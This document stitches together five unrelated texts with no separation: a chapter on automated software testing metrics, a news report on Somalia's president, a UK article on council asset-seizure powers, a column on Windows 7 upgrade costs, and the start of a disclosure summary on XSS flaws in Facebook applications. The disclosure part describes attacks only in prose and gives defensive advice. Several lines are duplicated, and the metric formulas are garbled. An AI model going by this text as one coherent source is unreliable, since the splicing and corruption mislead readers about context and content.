In addition to customer technical interchanges and walk - throughs , internal inspections of deliverable work products should take place , before anything is even presented to the customer , to support the detection and removal of defects and process / practice omissions or deficiencies early in the AST development and test cycle ; prevent the migration of defects to later phases ; improve quality and productivity ; and reduce cost , cycle time , and maintenance efforts .
Examine Constraints and Associated Risks
A careful examination of goals and constraints and associated risks should take place , leading to a systematic AST strategy and producing a predictable , higher - quality outcome and a high degree of success .
Combining a careful examination of constraints together with defect detection technologies will yield the best results .
Any constraint and associated risk should be communicated to the customer and risk mitigation strategies developed as necessary .
Implement Risk Mitigation Strategies
Defined " light weight " processes allow for iterative , constant risk assessment and review without the dreaded overhead .
If a risk is identified , appropriate mitigation strategies can be deployed .
Require ongoing review of cost , schedules , processes , and implementation to ensure that potential problems do not go unnoticed until too late ; instead , processes need to ensure that problems are addressed and corrected immediately .
For example , how will you mitigate the risk if your " star " developer quits ?
There are numerous possible answers :
Software development is a team effort and it is never a good practice to rely on one " star " developer .
Hire qualified developers , so they can integrate as a team and each can be relied on in various ways based on their respective qualifications .
One team member might have more experience than another , but neither should be irreplaceable , and the departure of one of them should not be detrimental to the project .
Follow good hiring and software development practices ( such as documenting and maintaining all AST - related artifacts ) and put the right people on the project ; we discuss the " how to " in our book " IAST . "
Additional risks could be missed deadlines or being over budget .
Evaluate and determine risk mitigation techniques in case an identified risk comes to fruition .
Safeguard the Integrity of the AST Process and Environments
Experience shows that it is important to safeguard the integrity of the AST processes and environment .
In IAST we discuss the importance of an isolated test environment and having it under configuration management .
For example , you might want to test any new technology to be used as part of the AST effort in an isolated environment and validate that a tool , for example , performs to product specifications and marketing claims before it is used on any AUT or customer test environment .
At one point we installed a tool on our Micron PC used for daily activities , only to have it blue - screen .
It turned out that the tool we wanted to test was n't compatible with the Micron PC .
To solve the problem , we actually had to upgrade the PC's BIOS .
An isolated test environment for these types of evaluation activities is vital .
The automator should also verify that any upgrades to a technology still run in the current environment .
The previous version of the tool may have performed correctly and a new upgrade may perform fine in other environments , but the upgrade may adversely affect the team 's particular environment .
We had an experience when a new tool upgrade was n't compatible with our e-mail software package any longer .
It was a good thing we caught this issue , because otherwise an upgrade install would have rendered the tool useless , as we heavily relied on e-mail notification , for example , if a defect was generated .
Additionally , using a configuration management tool to baseline the test repository will help safeguard the integrity of the automated testing process .
For example , all AST automation framework components , script files , test case and test procedure documentation , schedules , cost tracking , and other related AST artifacts need to be under configuration management .
Using a configuration management tool ensures that the latest and most accurate version control and records of AST artifacts and products are maintained .
For example , we are using the open - source tool Subversion in order to maintain AST product integrity ; we evaluate the best products available to allow for the most efficient controls on an ongoing basis .
Define , Communicate , and Track Schedules and Costs
It is not good enough to base a schedule on a marketing - department - defined deadline .
Instead , schedule and task durations need to be determined based on past historical performance and associated best estimates gathered from all stakeholders .
Additionally , any schedule dependencies and critical path elements need to be considered up front and incorporated into the schedule .
Project schedules need to be defined , continuously tracked , and communicated .
In order to meet any schedule - for example , if the program is under a tight deadline - only the AST tasks that can be successfully delivered in time are included in the schedule iteration .
As described in IAST , during the AST Phase 1 , test requirements are prioritized , which allows for prioritizing the most critical AST tasks to be completed as opposed to the less critical and lower - priority tasks , which can then be moved to later in the schedule , accordingly .
Once the requirements are prioritized , an initial schedule is presented to the customer for approval and not before the System Under Test ( SUT ) , AST requirements and associated level of effort are understood .
During the technical interchanges and walk - throughs , schedules are evaluated and presented on an ongoing basis to allow for continuous communication and monitoring .
Potential schedule risks should be communicated well in advance and risk mitigation strategies explored and implemented , as needed ; any schedule slips should be communicated to the customer immediately and adjustments made accordingly .
By closely tracking schedules and other required AST resources , we can also ensure that a cost tracking and control process is followed .
Inspections , walk - throughs , and other status reporting allow for closely monitored cost control and tracking .
Tracking cost and schedules and so forth allows for tracking of the project 's performance .
Track Actions , Issues , and Defects
A detailed procedure needs to be defined for tracking action items to completion .
Templates should be used that describe all elements to be filled out for action item reports .
Additionally , a procedure needs to be in place that allows for tracking issues / defects to closure , known as a defect tracking lifecycle .
See IAST for a sample defect tracking lifecycle used in the open - source defect tracking tool Bugzilla .
Various defect tracking lifecycles exist ; adapt one to your environment , tool , and project needs .
Once defined , put measures in place to verify that the defect or action item lifecycle is adhered to .
If an issue or defect is uncovered , a root cause analysis should be conducted .
See that section later on for more on root cause analysis .
AST Metrics
Metrics can aid in improving your organization 's automated testing process and tracking its status .
Much has been said and written about the need for using metrics carefully and to not let metrics drive an effort , i.e. do n't measure for the sake of measuring .
As with our recommended lightweight and adjustable process described in IAST , we recommend to use these metrics as an enhancement to the AST effort not to drive the AST effort .
Our software test teams have successfully used the metrics and techniques discussed here .
As the beginning quote implies , if you can measure something , then you have something you can quantify .
As time proceeds , software projects become more complex because of increased lines of code as a result of added features , bug fixes , etc .
Also , tasks must be done in less time and with fewer people .
Complexity over time has a tendency to decrease the test coverage and ultimately affect the quality of the product .
Other factors involved over time are the overall cost of the product and the time in which to deliver the software .
Carefully defined metrics can provide insight into the status of automated testing efforts .
When implemented properly , AST can help reverse the negative trend .
As represented in Figure 1.1 , automation efforts can provide a larger test coverage area and increase the overall quality of a product .
The figure illustrates that the goal of automation is ultimately to reduce the time of testing and the cost of delivery , while increasing test coverage and quality .
These benefits are typically realized over multiple test and project release cycles .
Figure 1.1 AST goal examples comparing current trend with automation implementation
Automated testing metrics can aid in making assessments as to whether coverage , progress and quality goals are being met .
Before we discuss how these goals can be accomplished , we want to define metrics , automated testing metrics , and what makes a good automated test metric .
What is a metric ?
The basic definition of a metric is a standard of measurement .
It can also be described as a system of related measures that facilitate the quantification of some particular characteristic . [ 2 ]
For our purposes , a metric can be seen as a measure that can be used to display past and present performance and / or predict future performance .
Metrics categories :
Most software testing metrics ( including the ones presented here ) fall into one of three categories :
Coverage : meaningful parameters for measuring test scope and success .
meaningful parameters for measuring test scope and success .
Progress : parameters that help identify test progress to be matched against success criteria .
Progress metrics are collected iteratively over time .
They can be used to graph the process itself ( e.g. , time to fix defects , time to test , etc. ) .
parameters that help identify test progress to be matched against success criteria .
Progress metrics are collected iteratively over time .
They can be used to graph the process itself ( e.g. , time to fix defects , time to test , etc. ) .
Quality : meaningful measures of testing product quality .
Usability , performance , scalability , overall customer satisfaction , and defects reported are a few examples .
What are automated testing metrics ?
Automated testing metrics are metrics used to measure the performance ( past , present , and future ) of the implemented automated testing process and related efforts and artifacts .
Here we can also differentiate metrics related to unit test automation versus integration or system test automation .
Automated testing metrics serve to enhance and complement general testing metrics , providing a measure of the AST coverage , progress , and quality , not replace them .
What makes a good automated testing metric ?
As with any metrics , automated testing metrics should have clearly defined goals for the automation effort .
It serves no purpose to measure something for the sake of measuring .
To be meaningful , a metric should relate to the performance of the effort .
Prior to defining the automated testing metrics , there are metrics - setting fundamentals you may want to review .
Before measuring anything , set goals .
What is it you are trying to accomplish ?
Goals are important ; if you do not have them , what is it that you are measuring ?
It is also important to track and measure on an ongoing basis .
Based on the metrics outcome , you can decide whether changes to deadlines , feature lists , process strategies , etc. , need to be adjusted accordingly .
As a step toward goal setting , questions may need to be asked about the current state of affairs .
Decide what questions to ask to determine whether or not you are tracking toward the defined goals .
For example :
How many permutations of the test (s ) selected do we run ?
How much time does it take to run all the tests ?
How is test coverage defined ?
Are we measuring test cases against requirements ( generally during system testing ) , or are we measuring test cases against all possible paths taken through the units and components ( generally used for unit testing ) ?
In other words , are we looking at unit testing coverage , code coverage , or requirements coverage ?
How much time does it take to do data analysis ?
Are we better off automating that analysis ?
What would be involved in generating the automated analysis ?
How long does it take to build a scenario and required driver ?
How often do we run the test ( s ) selected ?
How many people do we require to run the test ( s ) selected ?
How much system and lab time is required to run the test ( s ) selected ?
In essence , a good automated testing metric has the following characteristics :
It is objective .
It is measurable .
It is meaningful .
Data for it is easily gathered .
It can help identify areas of test automation improvement .
It is simple .
A few more words about metrics being simple : Albert Einstein once said , " Make everything as simple as possible , but not simpler . "
When applying this wisdom to AST and related metrics collection , you will see that
Simplicity reduces errors .
Simplicity is more effective .
Simplicity is elegant .
Simplicity brings focus .
It is important to generate a metric that calculates the value of automation , especially if this is the first time an automated testing approach has been used for a project .
IAST discusses ROI measurement in detail and provides various worksheets that can serve as a baseline for calculating AST ROI .
For example , there we mention that the test team will need to measure the time spent on developing and executing test scripts against the results that the scripts produce .
If needed , the test team could justify the number of hours required to develop and execute AST by providing the number of defects found using this automation that would likely not have been revealed during a manual test effort .
Specific details as to why the manual effort would not have found the defect can be provided ; some possible reasons are that the automated test used additional test data not previously included in the manual effort , or the automated test used additional scenarios and path coverage previously not touched manually .
Another way of putting this is that , for example , with manual testing you might have been able to test x number of test data combinations ; with automated testing you are now able to test x + y test data combinations .
Defects that were uncovered in the set of y combinations are the defects that manual testing may have never uncovered .
Here you can also show the increase in testing coverage for future software releases .
Another way to quantify or measure automation benefits is to show that a specific automated test could hardly have been accomplished in a manual fashion .
For example , say that during stress testing 1,000 virtual users execute a specific functionality and the system crashes .
It would be very difficult to discover this problem manually , using 1,000 test engineers or possibly even extrapolation as it is still very commonly used today .
AST can also minimize the test effort , for example , by the use of an automated test tool for data entry or record setup .
Consider the test effort associated with the system requirement that reads , " The system shall allow the addition of 10,000 new accounts . "
Imagine having to manually enter 10,000 accounts into a system in order to test this requirement !
An automated test script can easily support this requirement by reading account information from a file through the use of a looping construct .
The data file can easily be generated using a data generator .
The effort to verify this system requirement using test automation requires far fewer man-hours than performing such a test using manual test methods . [ 3 ]
The ROI metric that applies in this case measures the time required to manually set up the needed records versus the time required to set up the records using an automated tool .
What follows are additional metrics that can be used to help track progress of the AST program .
Here we can differentiate between test case and progress metrics and defect and defect removal metrics .
Percent Automatable or Automation Index
As part of an AST effort , the project is either basing its automation on existing manual test procedures , or starting a new automation effort from scratch , some combination , or even just maintaining an AST effort .
Whatever the case , a percent automatable metric or the automation index can be determined .
Percent automatable can be defined as the percentage of a set of given test cases that is automatable .
This could be represented by the following equation :
ATC No. of test cases automatable PA ( % ) =
-------- = (----------------------------------- ) TC
Total no. of test cases PA = Percent automatable ATC = Number of test cases automatable TC = Total number of test cases
When evaluating test cases to be developed , what is to be considered automatable and what is to be considered not automatable ?
Given enough ingenuity and resources , one can argue that almost anything can be automated .
So where do you draw the line ?
Something that can be considered " not automatable , " for example , could be an application area that is still under design , not very stable , and mostly in flux .
In cases such as this , you should evaluate whether it makes sense to automate .
See IAST for a detailed discussion of how to determine what to automate .
There we discussed that we would evaluate , given the set of test cases , which ones would provide the biggest return on investment if automated .
Just because a test is automatable does n't necessary mean it should be automated .
Prioritize your automation effort based on the outcome of this " what to automate " evaluation .
Figure 1.2 shows how this metric can be used to summarize , for example , the percent automatable of various projects or components within a project and to set the automation goal .
Once we know the percent automatable , we can use it as a baseline for measuring AST implementation progress .
Figure 1.2
Example of percent automatable ( automation index ) per project ( or component )
Automation Progress
Automation progress refers to the number of tests that have been automated as a percentage of all automatable test cases .
Basically , how well are you doing against the goal of automated testing ?
The ultimate goal is to automate 100 % of the " automatable " test cases .
This can be accomplished in phases , so it is important to set a goal that states the deadlines for when a specific percentage of the ASTs should be automated .
It is useful to track this metric during the various stages of automated testing development .
AA No. of test cases automated AP ( % ) =
-------- = (-------------------------------------- )
ATC No. of test cases automatable AP = Automation progress AA = Number of test cases automated ATC = Number of test cases automatable
The automation progress metric is a metric typically tracked over time .
In the case of Figure 1.3 , the time is weeks .
Figure 1.3
Test cases automated over time ( weeks )
Test Progress
A common metric closely associated with the progress of automation , yet not exclusive to automation , is test progress .
Test progress can simply be defined as the number of test cases ( manual and automated ) executed over time .
TC No. of test cases executed TP =
-------- = (-------------------------------------------- )
T
Total number of test cases TP = Test progress TC = Number of test cases executed T = Total number of test cases
The purpose of this metric is to track test progress and can be used to show how testing is tracking against the overall project plan .
More detailed analysis is needed to determine test pass / fail , which can be captured in a more refined metric ; i.e. , we need to determine not only how many tests have been run over time and how many more there are to be run , but also how many of those test executions actually pass consistently without failure so that the test can actually be considered complete .
In the test progress metric we can replace No. of test cases executed with No. of test cases completed , counting only those test cases that actually consistently pass .
Percent of Automated Test Coverage
Another AST metric we want to consider is percent of automated test coverage .
This metric determines what percentage of test coverage the automated testing is actually achieving .
Various degrees of test coverage can be achieved , depending on the project and defined goals .
Also depending on the types of testing performed , unit test automation coverage could be measured against all identified units , or functional system test coverage can be measured against all requirements , and so forth .
Together with manual test coverage , this metric measures the completeness of the test coverage and can measure how much automation is being executed relative to the total number of tests .
However , it does not say anything about the quality of the automation .
For example , 2,000 test cases executing the same or similar data paths may take a lot of time and effort to execute , but they do not equate to a larger percentage of test coverage .
Test data techniques discussed in IAST need to be used to effectively derive the number of test data elements required to test the same or similar data path .
Percent of automated test coverage does not indicate anything about the effectiveness of the testing taking place ; it is a metric that measures its dimension .
AC Automation coverage PTC ( % ) =
------- = (------------------------------- )
C Total coverage PTC = Percent of automated test coverage AC = Automation coverage C = Total coverage ( i.e. , requirements , units / components , or code coverage )
There is a wealth of material available regarding the sizing or coverage of systems .
A useful resource is Stephen H. Kan 's book Metrics and Models in Software Quality Engineering . [ 4 ]
Figure 1.4 provides an example of test coverage for Project A versus Project B over various iterations .
The dip in coverage for Project A might reveal that new functionality was delivered that had n't yet been tested , so that no coverage was provided for that area .

Test coverage per project over various iterations
Defect Density
Measuring defects is a discipline to be implemented regardless of whether the testing effort is automated or not .
Defect density is another well - known metric that can be used for determining an area to automate .
If a component requires a lot of retesting because the defect density is very high , it might lend itself perfectly to automated testing .
Defect density is a measure of the total known defects divided by the size of the software entity being measured .
For example , if there is a high defect density in a specific functionality , it is important to conduct a causal analysis .
Is this functionality very complex , and therefore is it to be expected that the defect density would be high ?
Is there a problem with the design or implementation of the functionality ?
Were the wrong ( or not enough ) resources assigned to the functionality , because an inaccurate risk had been assigned to it and the complexity was not understood ?
It also could be inferred that the developer responsible for this specific functionality needs more training .
D No. of known defects DD = ------- = ( ------------------------------- )
SS
Size of software entity DD = Defect density D = Number of known defects SS = Size of software entity
We can't necessary blame a high defect density on large software component size , i.e. while generally the thought is that a high defect density in a large component is more justifiable than in a small component , the small component could be much more complex than the large one .
AST complexity is an important consideration when evaluating defect density .
Additionally , when evaluating defect density , the priority of the defect should be considered .
For example , one application requirement may have as many as 50 low - priority defects and still pass because the acceptance criteria have been satisfied .
Still another requirement may have only one open defect , but that defect prevents the acceptance criteria from being satisfied because it is a high priority .
Higher - priority defects are generally weighted more heavily as part of this metric .
Defect Trend Analysis
Another useful testing metric in general is defect trend analysis .
Defect trend analysis is calculated as :
D No. of known defects DTA =
------- = (--------------------------------------- )
TPE No. of test procedures executed DTA = Defect trend analysis D = Number of known defects TPE = Number of test procedures executed over time
Defect trend analysis can help determine the trend of defects found over time .
Is the trend improving as the testing phase is winding down , or does the trend remain static or is it worsening ?
During the AST testing process , we have found defect trend analysis to be one of the more useful metrics to show the health of a project .
One approach to showing the trend is to plot the total number of defects over time , as shown in Figure 1.5 . [ 5 ]
Figure 1.5
Defect trend analysis : total number of defects over time ( here after weeks in testing )
Effective defect tracking analysis can present a clear view of the status of testing throughout the project .
Defect Removal Efficiency
One of the more popular metrics is defect removal efficiency ( DRE ) ; this metric is not specific to automation , but it is very useful when used in conjunction with automation efforts .
DRE is used to determine the effectiveness of defect removal efforts .
It is also an indirect measurement of product quality .
The value of the DRE is calculated as a percentage .
The higher the percentage , the greater the potential positive impact on the quality of the product .
This is because it represents the timely identification and removal of defects at any particular phase .
DT No. of defects found during testing DRE ( % ) =
------------ = ( -------------------------------------------- )
DT + DA No. of defects found during testing +
No. of defects found after delivery DRE = Defect removal efficiency DT = Number of defects found during testing DA = Number of defects found after delivery
Figure 1.6
Defect removal efficiency over the testing lifecycle effort
The highest attainable value of DRE is 1 , which equates to 100 % .
In practice , we have found that an efficiency rating of 100 % is not likely .
According to Capers Jones , world - class organizations have a DRE greater than 95 % . [ 6 ]
DRE should be measured during the different development phases .
For example , low DRE during analysis and design may indicate that more time should be spent improving the way formal technical reviews are conducted .
This calculation can be extended for released products as a measure of the number of defects in the product that were not caught during the product development or testing phases .
Automated Software Testing ROI
As we have discussed , metrics help define the progress , health , and quality of an automated testing effort .
Without such metrics , it would be practically impossible to quantify , explain with certainty , or demonstrate quality .
Along with quality , metrics also help with demonstrating ROI , covered in detail in IAST of this book .
ROI measurement , like most metrics , is an ongoing exercise and needs to be closely maintained .
Consider the ROI and the various testing metrics when investigating the quality and value of AST .
As shown in Figure 1.7 , metrics can assist in presenting the ROI for your effort .
Be sure to include all facets in your ROI metric as described in IAST .
Figure 1.7 AST ROI example ( cumulated costs over time )
Other Software Testing Metrics
Along with the metrics mentioned in the previous sections , there are a few more common test metrics useful for the overall testing program .
Table 1.1 provides a summary and high - level description of some of these additional useful metrics .
Table 1.1 Additional Common and Useful Software Test Metrics [ 7 ]
Metric Name Description Category Error discovery rate Number of total defects found / Number of test procedures executed
The error discovery rate is used to analyze and support a rational product release decision .
Progress Defect aging
The date a defect was opened versus the date the defect was fixed The defect aging metric indicates turnaround of the defect .
Progress Defect fix retest
The date a defect was fixed and released in a new build versus the date the defect was retested
The defect fix retest metric indicates whether the testing team is retesting the fixes fast enough , in order to get an accurate progress metric .
Progress Current quality ratio Number of test procedures successfully executed ( without defects ) versus the number of test procedures .
The current quality ratio metric indicates the amount of functionality that has successfully been demonstrated .
Quality Problem reports by priority
The number of software problem reports broken down by priority
The problem reports metric counts the number of software problems reported , listed by priority .
Quality
Root Cause Analysis
It is not good enough to conduct lessons learned after the AST program has been implemented .
Instead , as soon as a problem is uncovered , regardless of the phase or the type of issue - whether it's a schedule , budget , or software defect problem - a root cause analysis should be conducted , so that corrective actions and adjustments can be made .
Root cause analysis should not focus on determining blame ; it is a neutral investigation that determines the cause of the problem .
For example , a root cause template could be developed where stakeholders can fill in their respective parts if a defect is uncovered in production .
The template could list neutral questions , such as , " What is the exact problem and its effect ? "
" How was it uncovered and who reported it ? "
" When was it reported ? " " Who is / was affected by this problem ? "
" What is the priority of the problem ? "
Once all this information has been gathered , stakeholders need to be involved in the discussion and determination of the root cause , how to resolve the issue ( corrective action to be taken ) and understand the priority of solving and retesting it , and how to prevent that sort of issue from happening in the future .
Defects will be uncovered despite the best - laid plans and implementations ; corrective actions , and adjustments are always needed , i.e. expect the unexpected , but have a plan for addressing it Effective AST processes should allow for and support the implementation of necessary corrective actions .
They should allow for strategic course correction , schedule adjustments , and deviation from AST phases to adjust to specific project needs , to support continuous process improvement and an ultimate successful delivery .
Root cause analysis is a popular area that has been researched and written about a great deal .
What we present here is our approach to implementing it .
For more information on root cause analysis and a sample template , review the SixSigma discussion on " Final Solution via Root Cause Analysis ( with a Template ) . " [ 8 ]
Summary
To assure AST program success , the AST goals need to be not only defined but also constantly tracked .
Defect prevention , AST and other software testing metrics , and root causes analysis implementation are important steps to help prevent , detect , and solve process issues and SUT defects .
With the help of these steps the health , quality , and progress of an AST effort can be tracked .
These activities can also be used to evaluate past performance , current status , and future trends .
Good metrics are objective , measurable , meaningful , and simple , and they have easily obtainable data .
Traditional software testing metrics used in software quality engineering can be applied and adapted to AST programs .
Some metrics specific to automated testing are
Percent automatable
Automation progress
Percent of automated testing coverage
Software automation ROI ( see IAST for more details )
Automated test effectiveness ( related to ROI )
Evaluate the metrics outcome and adjust accordingly .
Track budgets , schedules , and all AST program - related activities to ensure that your plans will be implemented successfully .
Take advantage of peer reviews and inspections , activities that have been proven useful in defect prevention .
As covered in IAST , in the test case requirements - gathering phase of your automation effort , evaluate whether it makes sense to automate or not .
Given the set of automatable test cases , determine which ones would provide the biggest ROI .
Consider that just because a test is automatable does n't necessary mean it should be automated .
Using this strategy for determining what to automate , you are well on your way to AST success .

CHICAGO — Ah , Somalia .
Land of a thousand gunshots .
The Hobbesian country , where life is brutish and short , has had some good news of late , though , in that it has a president with a modicum of a chance of leading it to stability .
Sheik Sharif Sheik Ahmed , who was elected by a de facto parliament in January 2009 , was in the U.S. last week trying to drum up support for his fledgling and extremely fragile administration .
GlobalPost interviewed him after he spoke to the Chicago Council on Global Affairs .
Since taking office nine months ago , Ahmed has been living under siege in a presidential compound called Villa Somalia .
But that 's the good part : he 's living , albeit guarded by a posse of Ugandan troops .
Somalia 's own threadbare military forces are too under - equipped and ill - trained to stand sentry , much less stand down against the extremist groups that prowl around the capital city of Mogadishu and elsewhere .
It 's these armed groups — principal among them the Islamic militancy known as Al
Shabaab — that are the wedge between peace and chaos .
Al Shabaab , which some experts believe has ties to Al Queda , is a ruthless organization that 's left a trail of dead throughout the country and poses a vexing problem for the new president : how does a leader with a weak military confront and destroy an outfit that prizes viciousness and anarchy ?
" This ideology cannot stand , " said a quiet , diminutive ex-teacher who now lives in constant danger .
His sojourn to the U.S. , which also included stops in Minnesota and Ohio , was designed to generate support from the Somali diaspora and keep his ailing country on Washington 's radar .
Ahmed had been driven out of Somalia in 2006 by U.S. - backed Ethiopian forces .
At the time , his brand of Islamic leadership and justice was considered too extreme .
Not anymore .
Now he 's Washington 's best hope to maintain some kind of order .
The U.S. has sent weapons to Ahmed 's forces and has said it will look for additional ways to support the new government .
U.S. Secretary of State Hillary Clinton sent her best wishes when they met in August .
Now Ahmed is probably hoping she sends some more firepower as well .

Alan Johnson is introducing the new powers next week Local councils are to get the power to seize the assets of minor offenders under government moves next week .
The Proceeds of Crime Act - brought in to target organised criminals could be used against housing benefit fraudsters and other less serious offenders .
The Police Federation has expressed concern that " intrusive powers " are to be given to people who are not police .
But the Home Office said seizing " ill - gotten gains " was a key part of the fight against all kinds of crime .
The move , which is being pushed through next week by Home Secretary Alan Johnson , is set out in a Statutory Instrument , which means it will not be debated by MPs .
Paul McKeever , of the Police Federation , told The Times : " The Proceeds of Crime Act is a very powerful tool in the hands of the police and police - related agencies and it should n't be treated lightly . "
Search warrants
He added that there was a " behind - the - scenes creep of powers occurring " and the the public would " would want such very intrusive powers to be kept in the hands of warranted officers and other law enforcement bodies which are vetted to a very high standard rather than given to local councils " .
Seizing ill - gotten gains is a key part of the fight against criminals  whether it is from small - time offences or organised crime
Home Office Under the move Accredited Financial Investigators , which include customs officers , Department of Work and Pensions investigators , trading standards and other local authority workers , are to be given the power to seize assets worth more than £ 1,000 ahead of a court ruling on their origin and to execute search warrants .
At the moment , these powers are executed on the investigators ' behalf by police officers .
The Home Office said the powers will be used against people who have benefited significantly from criminal behaviour and that investigators using them are subject to a code of conduct .
A spokeswoman said the powers would not be used against people in arrears on their council tax or parking fines , as has been reported .
She said : " We are determined to ensure criminals do not profit by breaking the law .
Seizing ill - gotten gains is a key part of the fight against criminals  whether it is from small - time offences or organised crime .
" Accredited Financial Investigators have played an integral role in the recovery of criminal assets since the Proceeds of Crime Act was introduced in 2003 , they are fully trained and their powers carefully controlled in law .
By giving them some new powers we are extending the fight against crime and freeing up valuable police time . "
But the Conservatives attacked the move - saying it could be abused by local authorities .
Shadow communities secretary Caroline Spelman said : " We have already seen how surveillance laws designed to tackle terror and serious crime have been routinely abused and over - used by town hall officials .
" I fear these new powers to inspect financial records and seize assets will also end up being misused and will divert resources to minor breaches like being late in paying a parking fine . "
' Deeply disappointing '
When the Proceeds of Crime Act was introduced it was meant to be used to deprive major organised criminals of their lavish lifestyles .
The then home secretary David Blunkett said it would target " the homes , yachts , mansions and luxury cars of the crime barons " .
But Mr Blunkett said earlier this year that the law had been " deeply disappointing " after a BBC Panorama documentary revealed how major drug dealers and money launderers were making a mockery of it .
Using the Freedom of Information Act , Panorama found that in the last three years the Scottish unit responsible for criminal confiscation has frozen £ 60 m of assets - but has only succeeded in taking back £ 6 m of that total .
In the UK as a whole , £ 137 m was recovered last year .
The act has increasingly been used by police to seize the assets of minor offenders .

When you include replacement hardware , admin costs , application testing , and replacing incompatible apps , Gartner 's VP of research , Michael Silver , believes that -- in a hypothetical organization with 2,500 Windows users -- the cost of upgrading from Windows XP to Windows 7 will run $ 1,035 to $ 1,930 per user .
Silver 's cost estimate of migrating from Vista is a fraction of that number : from $ 339 to $ 510 .
No doubt organizations already mired in Vista will roll out Windows 7 in a hurry for usability , compatibility , and performance reasons .
But the value prop for the XP masses remains elusive .
[ Pound for pound , which is the better desktop OS , Snow Leopard or Windows 7 ?
Find InfoWorld 's answer to that question in our PC vs. Mac deathmatch . ]
After last week 's saturation coverage of Windows 7 , I will spare you the laundry list of changes and new features ( check out our Windows 7 Deep Dive Report for that ) .
But I ask you to imagine the hypothetical CFO of that hypothetical 2,500 - user organization , staring at an upgrade cost of between $ 2,587,500 and $ 4,825,000 .
Glaring at that number , looking at it sideways , maybe turning it upside down .
And this buys us ... what , exactly ?
Even as , post downturn , the desktop hardware upgrade cycle kicks into gear again -- which Gartner says is already happening -- the obvious fact that Windows 7 will be pre-installed on new hardware does not ensure migration .
As InfoWorld 's Galen Gruman reported last week in " Was Windows 7 worth saving XP for ? " a Hewlett - Packard exec said he expects many if not most businesses to " downgrade " Windows 7 to XP through much of 2010 ( an option for some editions of Windows 7 until April 23 , 2011 ) .
It 's tempting to be dramatic and declare the Windows treadmill broken beyond repair .
Steve Ballmer 's rather manic performance at the official Windows 7 launch last Thursday suggests that , in his heart of hearts , even he believes that the world has changed .
I could push things even further and point to today 's " PC vs. Mac deathmatch : Snow Leopard beats Windows 7 " as evidence that the Mac will eventually become the default corporate desktop .
But I 'm not going to go there .
Other Windows alternatives -- desktop Linux , say , or Google OSes in the cloud -- have their own huge obstacles .
It 's a safe bet that by the end of 2011 it will be more of a pain in the butt for businesses to hang on to XP than it will be to upgrade to Windows 7 , and eventually , we will slouch into the new OS .
Meanwhile , we can speculate all we like about Windows 8 .
But what , exactly , would make any new revision of a desktop OS a thrill ?
Until the industry discovers -- as it has attempted to do for the past decade -- a vastly more compelling way to integrate the Internet into everyday desktop user experience , the old desktop dynamic will continue to limp along .
The treadmill may not be broken , but man , has it slowed down .

Posted by theharmonyguy in Facebook , FAXX Hacks |
Introduction
The Month of Facebook Bugs , or FAXX Hacks , is a series of reports on vulnerabilities in Facebook applications .
The series was a volunteer research project coordinated by an anonymous blogger known as theharmonyguy .
All of the vulnerabilities were reported to Facebook and / or relevant application developers prior to their publication .
While one could take several approaches in enumerating “ Facebook bugs , ” this particular series focused on cross - site scripting holes in Facebook applications .
The name FAXX refers to Facebook Application XSS+XSRF , as nearly any XSS vulnerability in a Facebook application allows a sort of cross - site request forgery in that one can use application credentials to make requests to the Facebook API .
This is demonstrated in code examples below .
The series helps to quantify the sore lack of application security on the Facebook Platform , a fact perhaps well - known to those in the security community , but not to many others .
Furthermore , anecdotal evidence suggests many Facebook users fail to understand distinctions between Facebook and third - party applications , much less the implications of issues with the current Facebook Platform , such as the level of access to user data brought by authorizing an application .
Cross - site scripting vulnerabilities are significant on any web site , but when combined with a user ’s trust in Facebook and access to the Facebook API , they become even more dangerous .
Summary of Findings
Many Facebook applications , even widely used ones or seemingly trustworthy ones , lack basic security precautions .
Specifically , cross -site scripting vulnerabilities were found in a wide range of Facebook applications .
Each such vulnerability can be exploited to execute malicious JavaScript , such as malware delivery .
In addition , such holes allow an attacker to access profile information , including personal details , status updates , and photos , of a victimized user and their friends .
Moreover , these vulnerabilities can be used to send notifications or post feed stories , allowing for viral distribution .
While each application hole affects users who have already authorized the application , clickjacking can often target users who have not .
The series focused on vulnerabilities in legitimate applications , but rogue applications , which could easily exploit clickjacking , have also been noted by others .
All of the vulnerabilities reported in the series have been patched , but attacks that exploit application holes remain possible .
Preventing future problems due to application vulnerabilities requires action from both application developers and Facebook .
Statistics
The series demonstrated vulnerabilities affecting over 9,700 Facebook applications .
Over half of the vulnerabilities affected applications that had passed the Facebook Verified Application program .
Six of the hacked applications ranked among the top ten by monthly active users at publication .
The published monthly active user counts for hacked applications total to more than 218 million .
While the previous figure includes overlaps , each vulnerability affected any user who had authorized the application , whether currently active or not .
Nearly two - thirds of the vulnerabilities in the first half of the series allowed for clickjacking attacks that would affect any Facebook user .
( Applications in the second half of the series were not checked for clickjacking due simply to time constraints . )
Vulnerabilities in popular applications that allow for clickjacking mean nearly any Facebook user could fall prey to a FAXX hack .
Seven of the current top ten application developers by combined monthly active users had at least one vulnerable application .
Nine of the developers contacted took over a week to build a patch for an application vulnerability .
Responsiveness
Many application developers were very responsive , expressed that application security was a priority , and appreciated notification of the vulnerabilities .
I certainly recognize that it ’s much easier to point out holes in someone else ’s work than to spend the effort required to build a large - scale application .
I applaud the efforts of hard - working developers who understand the seriousness of these problems and who take application security seriously .
That said , several developers took a while to respond to either me or Facebook .
One vulnerability was not patched until more than two weeks after first being reported .
I realize that patches take time , but this particular hole should have been a fairly simple fix .
I was also a bit disappointed by some of Facebook ’s responses .
Do n’t get me wrong — I ’m very grateful for the security contact who got in touch with me early on .
He patiently fielded dozens of e-mails about application issues , and I thank him greatly for his efforts .
But as I sent reports of discovered holes to Facebook , the Platform Policy Team would then notify the developer .
( I also made a point of looking for e-mail addresses for developers , and always contacted them directly if I found any addresses . )
On two occasions , I received a copy of the message that Facebook sent the developer .
Here is the body of one of them :
To the developer of application ID # XXXXXXXX , We ’re writing to inform you that your application , [ Application Name ] , has been reported to contain a cross - site scripting vulnerability .
Specifically , the [ URI parameter ] parameter of the [ page name ] page can accept FBML or HTML that can load in other pages via an iframe .
Please contact theharmonyguy@gmail.com for more information , and let us know when this issue has been resolved .
Thank you in advance , [ Name ] Platform Policy Team Facebook
As you can imagine , several developers who contacted me thought I was associated with Facebook .
I would also note that the information I sent to Facebook included an example URI demonstrating the hole .
After seeing the above e-mail , I mentioned the terseness of it to my security contact and requested Facebook communicate more with affected developers .
I did n’t see any of the reports later in the month , but hopefully they were more helpful .
Lessons for Developers
Sanitize all inputs .
That includes every bit of data processed by the application , whether loaded from a Facebook user ’s profile , loaded from a database , submitted with a form , or received from the query string of an address .
Never assume that a given parameter will be clean or of the expected type .

Never assume that a given parameter will be clean or of the expected type .
